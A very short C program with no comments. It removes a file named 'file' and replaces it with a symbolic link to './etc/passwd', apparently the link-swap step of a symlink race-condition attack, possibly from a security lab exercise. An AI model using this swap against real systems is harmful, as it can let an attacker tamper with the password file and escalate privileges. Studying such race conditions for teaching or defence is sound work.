#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void main()
{
    unlink("file");
    symlink("./etc/passwd","file");
}
